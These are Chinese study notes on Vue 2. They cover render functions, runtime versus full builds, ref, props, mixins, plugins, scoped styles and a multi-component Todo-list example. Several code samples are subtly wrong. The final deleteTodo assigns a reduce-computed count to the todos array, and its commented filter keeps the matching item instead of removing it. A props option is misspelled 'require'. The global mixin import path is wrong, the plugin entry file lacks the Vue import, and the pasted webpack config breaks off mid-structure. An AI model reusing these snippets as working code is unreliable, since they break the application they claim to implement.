 *  该文件是整个项目的入口文件
*/

//引入vue 脚手架已经下好了
import Vue from 'vue'
//引入App组件，它是所有组件的父组件
import App from './App.vue'

//关闭vue的生产提示
Vue.config.productionTip = false

//创建vue实例对象  vm
new Vue({
el:'#app'
  //将App组件放入容器中
  // render: h => h(App),
}).$mount('#app')
~~~

----

![image-20221021232413610](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210212324707.png)

----

> 当前使用的 vue是阉割版的vue 没有模板渲染引擎
>
> 解决：
>
> 1.引入完整的vue
>
> 2.使用render函数





引入完整的vue

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
// import Vue from 'vue'
// import Vue from 'vue/dist/vue.runtime.mjs'


//引入完整版的vue
import Vue from 'vue/dist/vue'
import School from './components/School.vue';


//引入App组件，它是所有组件的父组件
import App from './App.vue'

//关闭vue的生产提示
Vue.config.productionTip = false

//创建vue实例对象  vm
new Vue({
  template:`
  <div>
  	<App/>
  </div>
  `,
    //注册组件
  components:{App}
}).$mount('#app')

~~~





---

![image-20221022000934310](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210220851938.png)

----







## 使用render函数：

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

//引入vue 脚手架已经下好了
import Vue from 'vue'
//引入App组件，它是所有组件的父组件
import App from './App.vue'

//关闭vue的生产提示
Vue.config.productionTip = false

//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  // render: h => h(App),
  render(createElement){
    console.log(typeof createElement);
    return createElement('h1','你好喔！！');
  }
}).$mount('#app')
~~~

----

![image-20221021234023876](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210212340736.png)

---

![image-20221021233642764](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210212336816.png)

----





根据js的基础知识可得：

~~~js
  render(createElement){
    return createElement('h1','你好喔！！');
  }
~~~

~~~~js
//因为对内部的 this没有要求 写成箭头函数
render:(createElement)=>{
    return createElement('h1','你好喔！！');
  }
~~~~

~~~js
//又因为箭头函数可以简写
render: createElement => createElement('h1','你好喔！！');
~~~

~~~js
//又因为 我创建的不是html元素 而是 组件
render:createElement=> createElement(App);
~~~

~~~js
render:h=> h(App);
~~~

----

![image-20221021234918532](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210212349697.png)

----







## 关于不同版本的Vue：

1.`vue.js`与 `vue.runtime.xxx.js` 的区别：

（1）vue.js 是完整版的Vue，包含：**核心功能 + 模板解析器**。
（2）vue.runtime.xxx.js 是运行版的Vue，只包含：核心功能：没有模板解析器。

2.因为vue.runtimetxxx.js 没有模板解折器：所以不能使用template配置项，需要使用render函数按收到的createElement函数去指定具体内容.





Vue 脚手架隐藏了所有 webpack 相关的配置，若想查看具体的 webpack 配置， 请执行：`vue inspect > output.js`

得到一个 output.js文件：

~~~js
{
  mode: 'development',
  context: 'D:\\learn\\尚硅谷\\Vue\\Demos\\first-demo',
  output: {
    hashFunction: 'xxhash64',
    path: 'D:\\learn\\尚硅谷\\Vue\\Demos\\first-demo\\dist',
    filename: 'js/[name].js',
    publicPath: '/',
    chunkFilename: 'js/[name].js'
  },
  resolve: {
    alias: {
      '@': 'D:\\learn\\尚硅谷\\Vue\\Demos\\first-demo\\src',
      vue$: 'vue/dist/vue.runtime.esm.js'
    },
    extensions: [
      '.mjs',
      '.js',
      '.jsx',
      '.vue',
      '.json',
      '.wasm'
    ],
    modules: [
      'node_modules',
      'D:\\learn\\尚硅谷\\Vue\\Demos\\first-demo\\node_modules',
      'D:\\learn\\尚硅谷\\Vue\\Demos\\first-demo\\node_modules\\@vue\\cli-service\\node_modules'
    ]
  },
  resolveLoader: {
    modules: [
      'D:\\learn\\尚硅谷\\Vue\\Demos\\first-demo\\node_modules\\@vue\\cli-plugin-babel\\node_modules',
      'D:\\learn\\尚硅谷\\Vue\\Demos\\first-demo\\node_modules\\@vue\\cli-service\\lib\\config\\vue-loader-v15-resolve-compat',
      'node_modules',
      'D:\\learn\\尚硅谷\\Vue\\Demos\\first-demo\\node_modules',
      'D:\\learn\\尚硅谷\\Vue\\Demos\\first-demo\\node_modules\\@vue\\cli-service\\node_modules'
    ]
  },
  module: {
    noParse: /^(vue|vue-router|vuex|vuex-router-sync)$/,
    rules: [
      /* config.module.rule('esm') */
      {
        test: /\.m?jsx?$/,
        resolve: {
          fullySpecified: false
        }
      },
      /* config.module.rule('vue') */
      {
        test: /\.vue$/,
        use: [
          /* config.module.rule('vue').use('vue-loader') */
          {
            loader: 'D:\\learn\\尚硅谷\\Vue\\Demos\\first-demo\\node_modules\\@vue\\vue-loader-v15\\lib\\index.js',
            options: {
              compilerOptions: {
                whitespace: 'condense'
              }
            }
          }
        ]
      },
      /* config.module.rule('vue-style') */
      {
        test: /\.vue$/,
        resourceQuery: /type=style/,
        sideEffects: true
      },
      /* config.module.rule('pug') */
      {
        test: /\.pug$/,
        oneOf: [
          /* config.module.rule('pug').oneOf('pug-vue') */
          {
            resourceQuery: /vue/,
            use: [
              /* config.module.rule('pug').oneOf('pug-vue').use('pug-plain-loader') */
              {
                loader: 'pug-plain-loader'
              }
            ]
          },
          /* config.module.rule('pug').oneOf('pug-template') */
          {
            use: [
              /* config.module.rule('pug').oneOf('pug-template').use('raw') */
              {
                loader: 'raw-loader'
              },
              /* config.module.rule('pug').oneOf('pug-template').use('pug-plain-loader') */
              {
                loader: 'pug-plain-loader'
              }
            ]
          }
        ]
      }
              /* config.module.rule('css').oneOf('vue-modules').use('postcss-loader') */
              {
                loader: 'D:\\learn\\尚硅谷\\Vue\\Demos\\first-demo\\node_modules\\postcss-loader\\dist\\cjs.js',
                options: {
                  sourceMap: false,
                  postcssOptions: {
                    plugins: [
                      function () { /* omitted long function */ }
                    ]
                  }
                }
              }
            ]
          },
  entry: {
    app: [
      './src/main.js'
    ]
  }
}

~~~

> 只能看 修改无效



想要修改vue的配置：

配置参考：

> https://cli.vuejs.org/zh/config/

关闭语法检查：

~~~js
const { defineConfig } = require('@vue/cli-service')
module.exports = defineConfig({
  transpileDependencies: true,
  /*关闭语法检查*/
  lintOnSave:false  
})
~~~









## ref 与 props





### ref属性

1.被用来给元素或子组件注册引用信息（id的替代者》
2.应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
3，使用方式：

打标识：`<h1 ref="xxx">.....</h1> ` 或` <School ref="xxx"></School>`
获取：`this.$refs.xxx`



School.vue

~~~vue
<template>
 <div>
    <h3>名称：{{name}}</h3>
    <h3>  地址：{{address}}</h3>
 </div>
</template>

<script>
export default {
    data(){
        return {
            name:'归附',
            address:'美国'
        }
    }
}
</script>
~~~



App.vue

~~~vue
<template>
    <div>
        <h1 v-text="msg" ref="msg"></h1>
        <button @click="show" ref="showDom">点我显示dom</button>
        <School ref="sch"/>
    </div>
</template>

<script>
import School from './components/School'
export default {
    data(){
        return{
            msg:'学习vue'
        }
    },
    components:{School},
    methods:{
        show(){
            console.log(this.$refs.msg);
            console.log(this.$refs.showDom);
            console.log(this.$refs.sch);
        }
    }

}
</script>
~~~



main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
// import Vue from 'vue'
// import Vue from 'vue/dist/vue.runtime.mjs'


//引入完整版的vue
import Vue from 'vue/dist/vue'


//引入App组件，它是所有组件的父组件
import App from './App.vue'

//关闭vue的生产提示
Vue.config.productionTip = false

//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App)
}).$mount('#app')
~~~

----

![image-20221022094536075](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210220945187.png)

-----







配置项props

School.vue

~~~vue
<template>
 <div>
     <h1>{{msg}}</h1>
    <h3>名称：{{name}}</h3>
    <h3>地址：{{address}}</h3>
    <h3>价格：{{myMoney+1}}</h3>
    <button @click="add">加钱</button>
 </div>
</template>

<script>
export default {
    data(){
        return {
            msg:'欢迎',
            //优先级是 接收的参数优先于 在data中定义的
            myMoney:this.money
        }
    },
    // 类似于 微信支付 别人付款 你要收款
    // props:['name','address','money'] //简单声明接收

    //类型限制
/*     props:{
        name:String,
        address:String,
        money:Number
    } */

//类型限制 + 必要性限制 + 默认值指定
    props:{
        name:{
            type:String,
            require:true
        },
        money:{
            type:Number,
            default:120
        },
        address:{
            type:String,
            default:'伊拉克'

        }
    },
    methods:{
        add(){
            this.myMoney++;
        }
    }
}
</script>

<style>

</style>
~~~

----

![image-20221022144641973](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210221446083.png)

----

功能：让组件接收外部传过来的数据

（1）传递数据：

~~~
<Demo name="xxxxx"/>
~~~

(2) 接收数据

第一种方式（只接收）
~~~
props:['name']
~~~

第二种方式（限制类型）：
~~~js
props:{
    name:Number
}
~~~

第三种方式（限制类型、限制必要性、指定默认值）：

~~~js
props:{
    name:{
    type:String，//类型
    required:true，//必要性
    default:'老王’//默认值
}
~~~

**备注：**

props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告。若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据





 ### mixin（混入）
功能：可以把多个组件共用的配置提取成一个混入对象

使用方式：第一步定义混合 并 暴露 例如：

~~~js
export const 名字 ={
    data（）{....}，

	methods:{...}，
    
    mounted:{....}

    ...................
}
~~~

第二步使用混入，例如：
（1）全局混入：Vue.mixin()

（2）局部混入：mixins:['xxxx' , 'xxxxx']







局部混入：

Student.vue

~~~vue
<template>
 <div>
    <h3>名称：{{name}}</h3>
    <h3>年龄：{{age}}</h3>
    <h3>性别{{sex}}</h3>
    <button @click="showName">获取名字</button>
    <h2>{{msg}}</h2>
 </div>
</template>

<script>
import {mixin} from '../mixin.js'

export default {
    
    name:'Student',
    data(){
        return {
            name:"fgcy",
            age:12,
            sex:'未知'
        }
    },
    mixins:[mixin],
    mounted(){
        console.log("!");
    }
/*     methods:{
        showName(){
            alert(this.name);
        }
    } */

}
</script>
~~~



School.vue

~~~vue
<template>
 <div>
    <h3>名称：{{name}}</h3>
    <h3>地址：{{address}}</h3>
    <h3>价格：{{momey+1}}</h3>
    <button @click="showName">获取名字</button>
    <h2>{{msg}}</h2>

 </div>
</template>

<script>
import {mixin} from '../mixin.js'

export default {
    name:'School',
    data(){
        return {
            name:"中大",
            address:'广东',
            momey:123
        }
    },
     
    mixins:[mixin]
/*     methods:{
        showName(){
            alert(this.name);
        }
    } */

}
</script>
~~~





mixin.js 【src下】

~~~js
//分别暴露
export const mixin={
    //混合中的 数据与 方法最终会到vm上
    //当出现同名时，以组件写的为准
    methods:{
        showName(){
            alert(this.name);
        }
    },
    data(){
        return {
            msg:'122'
        }
    },

    //当混合配置 和 组件都配置的 mounted函数时 两个都要
    mounted() {
        console.log("!!!");
    },
}
~~~



在main.js中配置 全局混合

~~~js
import {mixin} from '../mixin.js'
Vue.mixin(mixin)
~~~



----

![image-20221022154024639](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210221540939.png)

----



   



### 插件

main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/
//引入App组件，它是所有组件的父组件
import App from './App.vue'

import plugins from './plugins.js'

//关闭vue的生产提示
Vue.config.productionTip = false

//使用插件
Vue.use(plugins);

//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App)
}).$mount('#app')
~~~



plugins.js

~~~js
export default{
    install(Vue){
       console.log(Vue);

        //定义一个全局的过滤器
        Vue.filter('mySlice',function(val,len){
            return val.slice(0,len);
        });


        //定义全局指令
        Vue.directive('fbind',{
            //当指令与函数建立绑定关系时调用
            bind(element,binding){
                element.value=binding.value;
                console.log('bind');
            },
            //当重新渲染页面时调用
            update(element,binding){
                element.value=binding.value;
                console.log('update');
            },
            //当将真实dom元素添加到页面时
            inserted(element,binding){
                element.focus();
                console.log('inserted');
            }
        });

        Vue.mixin({
            data(){
                return{
                    x:111,
                    y:555
                }
            }
        });
      
    }
}
~~~



---

![image-20221022160916339](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210221609922.png)

----





功能：用于增强vue本质：包含install 方法的一个对象，install的第一个参数是Vue：第二个以后的参数是插件使用者传递的数据
定义插件：

~~~js
对象.install = function（Vue，options）{
//1，添加全局过器
Vue.filter（....）
//2，添加全局指令
Vue.directive(....)
//3配置全局混入（合）
Vue.mixin(....)

//4，添加实例方法
Vue.prototype.$myMethod = function(){...}
Vue.prototype.$myProperty = xxx
~~~

使用插件：Vue.use()





### scoped样式
作用：让样式在局部生效，防止冲突写法：`<style scoped>`



School.vue

~~~vue
<template>
 <div class=" demo">
    <h3>名称：{{name}}</h3>
    <h3>地址：{{address}}</h3>
    <h3>价格：{{momey+1}}</h3>
 </div>
</template>

<script>

export default {
    name:'School',
    data(){
        return {
            name:"中大",
            address:'广东',
            momey:123
        }
    },
}
</script>

<!-- 没有加scoped -->
<style>
.demo{
    background-color:bisque;
}
</style>
~~~





Student.vue

~~~vue
<template>
 <div class="demo">
    <h3>名称：{{name }}</h3>
    <h3>年龄：{{age}}</h3>
    <h3>性别{{sex}}</h3>
 </div>
</template>
<script>

export default {
    
    name:'Student',
    data(){
        return {
            name:"fgcy",
            age:12,
            sex:'未知'
        }
    }
}
</script>
<!-- 没有加scoped -->
<style>
.demo{
    background-color: aqua;
}
</style>
~~~



在组件中，样式是会被合并的 类名冲突时，后来的组件的样式顶替之前的

-----

![image-20221022163717330](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210221643860.png)

-----





~~~html
<style scoped>
    ..................
</style>
~~~



原理是标签属性选择器：

----

![image-20221022164456202](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210221644361.png)

----





## 3.5 Todo-list 案例





### 使用父子组件数据传递 实现 勾选功能

main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
 import Vue from 'vue'


//引入App组件，它是所有组件的父组件
import App from './App.vue'


//关闭vue的生产提示
Vue.config.productionTip = false



//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App)
}).$mount('#app')
~~~



App.vue

~~~vue
<template>
<div id="root">
  <div class="todo-container">
    <div class="todo-wrap">
        <MyHeader :addTodoObj="addTodoObj"/>
        <List :todos="todos" :checkTodoFlag="checkTodoFlag"/>
        <MyFooter/>
    </div>
  </div>
</div>
</template>

<script>
import MyHeader from './components/MyHeader.vue'
import MyFooter from './components/MyFooter.vue'
import List from './components/List.vue'


export default {
    data(){
        return {
            todos:[
                {id:'001',title:'唱',done:false},
                {id:'002',title:'跳',done:true},
                {id:'003',title:'rap',done:false}
            ]
        }
    },

    components:{MyHeader,MyFooter,List},
    methods:{
        addTodoObj(todoObj){
            this.todos.unshift(todoObj);
        },
        checkTodoFlag(id){
            this.todos.forEach((obj)=>{
                if(obj.id===id){
                   obj.done=!obj.done;
                }
            })
        }
    }
}
</script>

<style>
/*base*/
body {
  background: #fff;
}

.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}

.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}

.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}

.btn:focus {
  outline: none;
}

.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}

/*header*/

/*main*/

/*item*/

/*footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}

.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}
</style>
~~~



MyHeader.vue

~~~vue
<template>
   <div class="todo-header">
        <input type="text" placeholder="请输入你的任务名称，按回车键确认" @keyup.enter="add"/>
      </div>
</template>

<script>
    // npm i nanoid
    //精简版的 uuid
    import {nanoid} from 'nanoid'

export default {
    name:'MyHeader',
    data(){
        return {
            name:"中大",
            address:'广东',
            momey:123
        }
    },
    props:['addTodoObj'],
    methods:{
        add(event){
            let title=event.target.value;
            if(title=='') return;

            let todoObj={
                id:nanoid(),
                title,
                done:false
            }
            this.addTodoObj(todoObj);
            event.target.value='';
        }
    }
}
</script>

<!-- 没有加scoped -->
<style scoped>.todo-header input {
    width: 560px;
    height: 28px;
    font-size: 14px;
    border: 1px solid #ccc;
    border-radius: 4px;
    padding: 4px 7px;
  }
  
  .todo-header input:focus {
    outline: none;
    border-color: rgba(82, 168, 236, 0.8);
    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
  }
  
</style>
~~~





MyFooter.vue

~~~vue
<template>
      <div class="todo-footer">
        <label>
          <input type="checkbox"/>
        </label>
        <span>
          <span>已完成0</span> / 全部2
        </span>
        <button class="btn btn-danger">清除已完成任务</button>
      </div>
</template>
<script>

export default {
    name:'MyFooter',
    data(){
        return {
            name:"fgcy",
            age:12,
            sex:'未知'
        }
    }
}
</script>
<!-- 没有加scoped -->
<style scoped>
.demo{
    background-color: aqua;
}
</style>

~~~





List.vue

~~~vue
<template>
      <ul class="todo-main">
        <Item 
            v-for="todoObj in todos" 
            :key="todoObj.id" 
            :todo="todoObj" 
            :checkTodoFlag="checkTodoFlag"
        /> 
    
      </ul>
</template>
<script>
import Item from './Item.vue'
export default {
    name:'List',
    components:{
        Item
    },
    props:['todos','checkTodoFlag']

}
</script>
<!-- 没有加scoped -->
<style scoped>
.todo-main {
  margin-left: 0px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
} 
</style>
~~~



Item.vue

~~~vue
<template>
       <li>
          <label>
            <input type="checkbox" :checked="todo.done" @change="changeFlag(todo.id)"/>
            <span>{{todo.title}}</span>
          </label>
          <button class="btn btn-danger" style="display:none">删除</button>
        </li>
</template>
<script>

export default {
    name:'Item',
    props:['todo','checkTodoFlag'],
    methods:{
        changeFlag(id){
          this.checkTodoFlag(id);
        }
    }
}
</script>
<!-- 没有加scoped -->
<style scoped>
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}
</style>
~~~



### 使用v-model实现 勾选功能

Item.vue

~~~vue
<template>
       <li>
          <label>
            <!-- <input type="checkbox" :checked="todo.done" @change="changeFlag(todo.id)"/> -->

            <!-- 使用v-model 也能实现功能 但vue不建议修改 prop 中的数据 -->
            <input type="checkbox" v-model="todo.done"/>
            <span>{{todo.title}}</span>
          </label>
          <button class="btn btn-danger" style="display:none">删除</button>
        </li>
</template>
<script>

export default {
    name:'Item',
    props:['todo'],
}
</script>
<!-- 没有加scoped -->
<style scoped>
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}

</style>

~~~



List.vue

~~~vue
<template>
      <ul class="todo-main">
        <Item 
            v-for="todoObj in todos" 
            :key="todoObj.id" 
            :todo="todoObj" 
        /> 
    
      </ul>
</template>
<script>
import Item from './Item.vue'
export default {
    name:'List',
    components:{
        Item
    },
    props:['todos']

}
</script>
<!-- 没有加scoped -->
<style scoped>
.todo-main {
  margin-left: 0px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
} 
</style>

~~~



App.vue

~~~vue
<template>
<div id="root">
  <div class="todo-container">
    <div class="todo-wrap">
        <MyHeader :addTodoObj="addTodoObj"/>
        <List :todos="todos" />
        <MyFooter/>
    </div>
  </div>
</div>
</template>

<script>
import MyHeader from './components/MyHeader.vue'
import MyFooter from './components/MyFooter.vue'
import List from './components/List.vue'


export default {
    data(){
        return {
            todos:[
                {id:'001',title:'唱',done:false},
                {id:'002',title:'跳',done:true},
                {id:'003',title:'rap',done:false}
            ]
        }
    },

    components:{MyHeader,MyFooter,List},
    methods:{
        addTodoObj(todoObj){
            this.todos.unshift(todoObj);
        }
    }
}
</script>

<style>
/*base*/
body {
  background: #fff;
}

.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}

.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}

.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}

.btn:focus {
  outline: none;
}

.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}

/*header*/

/*main*/

/*item*/

/*footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}

.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}

</style>
~~~

----

![image-20221022210318676](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210222103966.png)

------

> 修改 props 中的 属性 vue是会报错的
>
> 【非对象的值改变    对象地址改变】





一个完整的todo - list 案例

main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
 import Vue from 'vue'


//引入App组件，它是所有组件的父组件
import App from './App.vue'


//关闭vue的生产提示
Vue.config.productionTip = false



//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App)
}).$mount('#app')
~~~



App.vue

~~~vue
<template>
<div id="root">
  <div class="todo-container">
    <div class="todo-wrap">
        <MyHeader :addTodoObj="addTodoObj"/>
        <List :todos="todos" :checkTodoFlag="checkTodoFlag" :deleteTodo="deleteTodo"/>
        <MyFooter :todos="todos" :selectAll="selectAll" :doClear="doClear"/>
    </div>
  </div>
</div>
</template>

<script>
import MyHeader from './components/MyHeader.vue'
import MyFooter from './components/MyFooter.vue'
import List from './components/List.vue'


export default {
    data(){
        return {
            todos:[
                {id:'001',title:'唱',done:false},
                {id:'002',title:'跳',done:true},
                {id:'003',title:'rap',done:false}
            ]
        }
    },

    components:{MyHeader,MyFooter,List},
    methods:{
        addTodoObj(todoObj){
            this.todos.unshift(todoObj);
        },
        checkTodoFlag(id){
            this.todos.forEach((obj)=>{
                if(obj.id===id){
                   obj.done=!obj.done;
                }
            })
        },
        //全选 /全不选
        selectAll(checked){
          this.todos.forEach((obj)=>{
            obj.done = checked;
          })
        },
        deleteTodo(id){
          //朴素写法
 /*          this.todos= this.todos.filter((obj)=>{
            return obj.id === id;
          }); */

          //炫酷写法
    /*       this.todos=  this.todos.reduce((pre,current)=>{
            return pre + (current.done === true ? 1:0);
          },0);  */

          //简写
          this.todos = this.todos.reduce((pre,current)=>pre +(current.done === true ? 1:0),0);

        },
        doClear(){
          this.todos = this.todos.filter((obj)=>{
             return obj.done===false;
          });
        }
    }
}
</script>

<style>
/*base*/
body {
  background: #fff;
}

.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}

.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}

.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}

.btn:focus {
  outline: none;
}

.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}

/*header*/

/*main*/

/*item*/

/*footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}

.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}

</style>
~~~



MyHeader.vue

~~~vue
<template>
   <div class="todo-header">
        <input type="text" placeholder="请输入你的任务名称，按回车键确认" @keyup.enter="add"/>
      </div>
</template>

<script>
    // npm i nanoid
    //精简版的 uuid
    import {nanoid} from 'nanoid'

export default {
    name:'MyHeader',
    data(){
        return {
            name:"中大",
            address:'广东',
            momey:123
        }
    },
    props:['addTodoObj'],
    methods:{
        add(event){
            let title=event.target.value;
            if(title=='') return;

            let todoObj={
                id:nanoid(),
                title,
                done:false
            }
            this.addTodoObj(todoObj);
            event.target.value='';
        }
    }
}
</script>

<!-- 没有加scoped -->
<style scoped>.todo-header input {
    width: 560px;
    height: 28px;
    font-size: 14px;
    border: 1px solid #ccc;
    border-radius: 4px;
    padding: 4px 7px;
  }
  
  .todo-header input:focus {
    outline: none;
    border-color: rgba(82, 168, 236, 0.8);
    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
  }
  
</style>
~~~



MyFooter.vue

~~~vue
<template>
      <div class="todo-footer" v-show="totalTodo">
        <label>
          <!-- <input type="checkbox" :checked="totalDone === totalTodo && totalTodo>0"/> -->

          <!-- v-model 默认拿的就是 checkbox的value值 -->
          <input type="checkbox" v-model="isAll"/>

        </label>
        <span>
          <span>已完成{{totalDone}}</span> / 全部{{totalTodo}}
        </span>
        <button class="btn btn-danger" @click="clearDone">清除已完成任务</button>
      </div>
</template>
<script>

export default {
    name:'MyFooter',
    data(){
        return {
            name:"fgcy",
            age:12,
            sex:'未知'
        }
    },
    props:['todos','selectAll','doClear'],

    computed:{
        totalDone(){
            let count=0;
            this.todos.forEach(obj => {
                if(obj.done === true){
                    count++;
                }
            });
            return count;
        },
        totalTodo(){
            return this.todos.length;
        },
        isAll:{
            get(){
                return this.totalDone === this.totalTodo && this.totalTodo>0;
            },
            set(value){
                this.selectAll(value);
            }
        }
    },
    methods:{
        clearDone(){
            this.doClear()
        }
    }
}
</script>
<!-- 没有加scoped -->
<style scoped>
.demo{
    background-color: aqua;
}
</style>

~~~



List.vue

~~~vue
<template>
      <ul class="todo-main">
        <Item 
            v-for="todoObj in todos" 
            :key="todoObj.id" 
            :todo="todoObj" 
            :checkTodoFlag="checkTodoFlag"
            :deleteTodo="deleteTodo"
        /> 
    
      </ul>
</template>
<script>
import Item from './Item.vue'
export default {
    name:'List',
    components:{
        Item
    },
    props:['todos','checkTodoFlag','deleteTodo'],

}
</script>
<!-- 没有加scoped -->
<style scoped>
.todo-main {
  margin-left: 0px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
} 
</style>

~~~



Item.vue

~~~vue
<template>
       <li>
          <label>
            <input type="checkbox" :checked="todo.done" @change="changeFlag(todo.id)"/>
            <span>{{todo.title}}</span>
          </label>
          <button class="btn btn-danger" @click="doDelete(todo.id)">删除</button>
        </li>
</template>
<script>

export default {
    name:'Item',
    props:['todo','checkTodoFlag','deleteTodo'],
    methods:{
        //改变勾选状态
        changeFlag(id){
          this.checkTodoFlag(id);
        },

        // 删除
        doDelete(id){
            this.deleteTodo(id);
        }
    }
}
</script>
<!-- 没有加scoped -->
<style scoped>
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}

li:hover {
  background-color: #fff;
}

li:hover button{
  display: block;
}
</style>

~~~

**总结TodoList案例：**

1.组件化编码流程：
（1）拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突
（2）实现动态组件：考虑好教据的存放位置，数据是一个组件在用，还是一些组件在用：
           1）一个组件在用：放在组件自身即可。
           2）一些组件在用：放在他们共同的父组件上（**状态提升**)
（3）.实现交互：从绑定事件开始
2.props适用于：
（1）父组件\==>子组件通信
（2）子组件==> 父组件通信（要求父先给子一个函数）
3.使用 v-model时要切记：v-model绑定的值不能是props传过来的值，因为 **props是不可以修改的**！
4.props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但 **不推荐这样做**。









